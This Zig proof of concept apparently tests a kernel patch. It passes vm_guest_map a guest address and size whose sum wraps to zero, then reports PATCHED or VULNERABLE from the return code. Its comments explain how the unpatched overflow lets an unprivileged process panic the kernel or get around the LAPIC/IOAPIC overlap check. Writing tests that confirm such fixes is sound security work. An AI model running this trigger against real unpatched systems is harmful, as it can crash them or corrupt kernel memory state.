// PoC for 5f9ee88 sub-check #1: vm_guest_map (guest_addr + size) overflow.
//
// Pre-patch: guestMap computed `guest_end = guest_addr + size` directly.
// In safety-checked builds, a wrap panics the kernel from unprivileged
// userspace (any process holding vm_create rights). In unchecked builds,
// the wrap folds the range into a small inner `guest_end` and the
// LAPIC/IOAPIC overlap test then returns false even when the wrap-covered
// range covers those pages, and the recorded GuestMemory region has
// guest_phys_start + size > 2^64 (deinit later sweeps wrapped pages).
//
// Post-patch: guestMap performs `std.math.add(u64, guest_addr, size)
// catch return E_INVAL` *before* the LAPIC/IOAPIC overlap check, rejecting
// every wrapping (guest_addr, size) pair with E_INVAL.
//
// Differential:
//   - PATCHED: vm_guest_map returns E_INVAL.
//   - VULNERABLE (unchecked-build wrap path): vm_guest_map returns E_OK
//     (or any non-E_INVAL value) and the kernel continues running.
//   - VULNERABLE (safety-checked build): the kernel panics inside the
//     guest_addr+size add and the PoC never prints anything; the absence
//     of the PATCHED line is itself the signal.
//
// We pass guest_addr = 0xFFFFFFFFFFFFF000 and size = 0x1000 so that
// (guest_addr + size) wraps exactly to 0. host_vaddr is a page-aligned
// buffer in our own user partition so the host-side checks pass on the
// pre-patch path.

const lib = @import("lib");
const syscall = lib.syscall;

var policy: [4096]u8 align(4096) = .{0} ** 4096;
var host_page: [4096]u8 align(4096) = .{0} ** 4096;

pub fn main(_: u64) void {
    const cr = syscall.vm_create(1, @intFromPtr(&policy));
    if (cr == syscall.E_NODEV) {
        syscall.write("POC-5f9ee88_1: SKIPPED (no VMX)\n");
        syscall.shutdown();
    }
    if (cr < 0) {
        syscall.write("POC-5f9ee88_1: UNEXPECTED vm_create failure\n");
        syscall.shutdown();
    }
    const vm_handle: u64 = @bitCast(cr);

    // Force first byte of the host page resident before the syscall so
    // the kernel-side host pre-fault path can't fail for an unrelated
    // reason on the pre-patch run.
    host_page[0] = 0xAA;

    const guest_addr: u64 = 0xFFFFFFFFFFFFF000;
    const size: u64 = 0x1000; // sum wraps to 0
    const rights: u64 = 0x3; // R+W

    const ret = syscall.vm_guest_map(vm_handle, @intFromPtr(&host_page), guest_addr, size, rights);

    if (ret == syscall.E_INVAL) {
        syscall.write("POC-5f9ee88_1: PATCHED (guest_addr+size overflow -> E_INVAL)\n");
    } else if (ret == syscall.E_OK) {
        syscall.write("POC-5f9ee88_1: VULNERABLE (overflow accepted, region recorded)\n");
    } else {
        syscall.write("POC-5f9ee88_1: VULNERABLE (overflow not E_INVAL)\n");
    }
    syscall.shutdown();
}
